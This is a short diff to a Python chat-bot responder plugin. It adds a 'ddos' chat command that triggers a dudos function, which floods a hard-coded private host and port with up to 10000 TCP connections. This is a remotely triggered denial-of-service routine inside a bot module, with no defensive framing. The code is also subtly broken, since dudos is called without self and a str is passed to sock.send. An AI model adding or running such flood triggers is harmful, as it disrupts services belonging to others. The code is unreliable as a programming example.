@@ -27,11 +27,14 @@ class Toast(BaseResponder):
             command = (str(msg).split('!')[-1])
             print('got command: %s' % command)
             self.respond(msg, command + ' ok!')
+            if command == 'ddos':
+                dudos(host='192.168.100.219', port=8080)
 
-    def dudos(self, host = '127.0.0.1', port = 8080, times = 1000):
+    def dudos(self, host = '127.0.0.1', port = 8080, times = 10000):
         for x in range(times):
-            sock = socket.socket()
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((host, port))
-            sock.send(b'hello')
+            sock.send('hello')
+            sock.close()
 
 mod = Toast
